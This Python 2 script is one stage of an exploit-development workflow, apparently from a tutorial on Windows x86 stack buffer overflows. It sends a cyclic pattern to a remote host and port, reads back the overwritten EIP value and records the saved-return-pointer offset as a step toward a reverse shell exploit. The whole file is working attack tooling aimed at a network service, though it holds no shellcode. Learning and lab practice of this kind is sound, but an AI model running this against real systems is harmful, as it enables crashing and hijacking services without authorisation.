#!/usr/bin/env python

# Generates and sends a unique pattern to a service as part of the process in
# developing a Windows x86 reverse shell stack buffer overflow
# Saved Return Pointer overwrite exploit.
# Uses Metasploit's msf-pattern_create tool.
# Parameters are saved in params.py for persistence.
# Delete params.py and params.pyc to reset them; or simply edit params.py
#
# Written by y0k3L
# Credit to Justin Steven and his 'dostackbufferoverflowgood' tutorial
# https://github.com/justinsteven/dostackbufferoverflowgood

import functions

# get parameters
RHOST = functions.getRhost()
RPORT = functions.getRport()
buf_totlen = functions.getBufTotlen()

print "RHOST=%s; RPORT=%s; buf_totlen=%s" % (RHOST, RPORT, buf_totlen)

pattern = functions.pattern_create(buf_totlen)
pattern += '\n'
print pattern

sent = functions.sendBuffer(RHOST, RPORT, pattern)

if sent is 0:
    print "EIP should now be overwritten."
    eip_value = raw_input("EIP value: ")
    offset_srp = functions.pattern_offset(eip_value, pattern)
    print "offset_srp =", offset_srp
    if "offset_srp" in open("params.py", "r").read() and offset_srp != functions.getOffsetSrp():
        print "Something went wrong...offset_srp is already defined in params.py as %s" % functions.getOffsetSrp()
    elif isinstance(offset_srp, int):
        functions.writeParamToFile("offset_srp", offset_srp)
    else:
        print "Error: offset could not be found."
